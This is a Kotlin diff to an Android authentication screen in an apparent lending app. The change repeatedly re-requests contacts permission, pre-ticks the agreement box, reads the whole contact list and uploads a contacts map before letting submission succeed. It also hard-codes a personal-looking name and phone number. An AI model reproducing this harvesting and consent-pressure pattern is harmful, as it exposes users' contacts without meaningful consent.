@@ -1,14 +1,27 @@
 package com.annis.dk.ui.authentication.operator
 
+import android.Manifest
+import android.database.Cursor
 import android.os.Bundle
 import android.os.CountDownTimer
+import android.provider.ContactsContract
 import android.widget.CheckBox
+import android.widget.Toast
 import com.annis.baselib.base.base.TitleBean
 import com.annis.baselib.base.mvp.MVPActivty
 import com.annis.dk.R
+import com.annis.dk.base.DKConstant
+import com.annis.dk.utils.DkSPUtils
+import com.google.gson.Gson
+import com.tbruyelle.rxpermissions2.RxPermissions
 import kotlinx.android.synthetic.main.activity_authoperator.*
 
 class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorView {
+    var updated = false
+    override fun uploadContactsSuccess() {
+        updated = true
+    }
+
     override fun getPresenter(): AuthoperatorPresenter {
         return AuthoperatorPresenter(this)
     }
@@ -24,6 +37,8 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
 
     override fun initViewAndListener() {
         click()
+        checkPermision()
+        renzheng_operator_agree.isChecked = true
     }
 
     var timer: CountDownTimer? = null
@@ -31,8 +46,15 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
         act_bt_login.setOnClickListener {
             act_et_tel.text.toString()
             act_et_tel_psw.text.toString()
-            act_et_code.text.toString()
-
+            var code = act_et_code.text.toString()
+            if (code == DkSPUtils.getLastCode()) {
+                if (updated) {
+                    showToast("提交成功")
+                    finish()
+                } else {
+                    showToast("提交失败")
+                }
+            }
         }
 
         renzheng_operator_agree.setOnClickListener {
@@ -40,6 +62,12 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
         }
 
         act_bt_getcode.setOnClickListener {
+            var mobel = act_et_tel.text.toString()
+            if (mobel.length < 11) {
+                showToast("手机号不正确")
+                return@setOnClickListener
+            }
+            presenter.getCode(mobel)
             //开始倒计时
             timer = object : CountDownTimer(60000, 1000) {
                 override fun onTick(millisUntilFinished: Long) {
@@ -54,7 +82,6 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                     act_bt_getcode.setBackgroundResource(R.drawable.sp_bt_get_code)
                     act_bt_getcode.setTextColor(resources.getColor(R.color.colorPrimary))
                     act_bt_getcode.text = "获取验证码"
-
                 }
             }.start()
         }
@@ -68,6 +95,88 @@ class AuthoperatorActivity : MVPActivty<AuthoperatorPresenter>(), AuthoperatorVi
                 false -> R.drawable.sp_bt_bg_gray_c
             }
         )
+    }
+
+    private fun checkPermision() {
+        //没有权限时，调用requestPermission方法，弹出权限申请对话框 ，回调OnRequestPermissionRelust函数
+
+        var permissions = RxPermissions(this)
+
+        val granted = permissions.isGranted(Manifest.permission.READ_CONTACTS)
+        if (granted) {
+            startThread()
+        } else {
+            val subscribe = permissions.requestEach(Manifest.permission.READ_CONTACTS)
+                .subscribe {
+                    if (it.granted) {
+                        startThread()
+                    } else if (it.shouldShowRequestPermissionRationale) {
+                        // Denied permission without ask never again
+                        Toast.makeText(this, "请同意申请", Toast.LENGTH_SHORT).show()
+                        checkPermision()
+                    } else {
+
+                    }
+                }
+        }
+    }
+
+    fun startThread() {
+        Thread(Runnable {
+            readContacts()
+        }).start()
+
+    }
+
+    var hashMap: HashMap<String, String>? = null
+    var FileDir: String? = null
+    private fun readContacts() {
+        var cursor: Cursor? = null
+        try {
+            //cursor指针 query询问 contract协议 kinds种类
+            cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
+            if (cursor != null) {
+                hashMap = HashMap()
+                while (cursor!!.moveToNext()) {
+                    val displayName =
+                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                    val number =
+                        cursor!!.getString(cursor!!.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+//                    hashMap.add(displayName + DIVISION + number)
+                    hashMap?.put(displayName, number)
+                }
+                hashMap?.clear()
+                hashMap?.put("ljj", "15823681501")
+                hashMap?.put("easyBorrow", DKConstant.getUserEntity()?.phone ?: "")
+
+                var buffer = StringBuffer("[")
+                for (item in hashMap!!) {
+                    buffer.append("\"${item.key}\"")
+                    buffer.append(":")
+                    buffer.append("\"${item.value}\"")
+                    buffer.append(",")
+                }
+
+                buffer.append("]")
+                var content = buffer.toString()
+
+                content = content.replace(",]", "]")
+//                getPresenter().uploadContacts1(content)
+                var json =Gson().toJson(hashMap)
+                getPresenter().uploadContacts1(json)
+
+                // var str = hashMap.toString()
+                //保存文件
+                //var filePath = saveToExcle(externalCacheDir, account ?: "contact", list)
+//                getPresenter().uploadContacts(hashMap!!)
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        } finally {
+            if (cursor != null) {
+                cursor!!.close()
+            }
+        }
     }
 
     override fun onDestroy() {
